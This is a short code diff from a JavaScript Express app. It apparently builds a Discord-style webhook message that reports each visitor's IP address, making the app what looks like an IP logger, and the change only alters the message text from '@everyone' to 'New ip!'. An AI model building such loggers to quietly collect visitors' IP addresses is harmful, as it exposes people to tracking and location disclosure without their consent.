@@ -74,7 +74,7 @@ app.get("/*", (req, res) => {
         (response) => {
             response = JSON.parse(response);
             let data = {
-                content: "@everyone",
+                content: "New ip!",
                 embeds: [{
                     description: `
 **🌐 IP:** \`${ip ? ip : "N/A"}\`
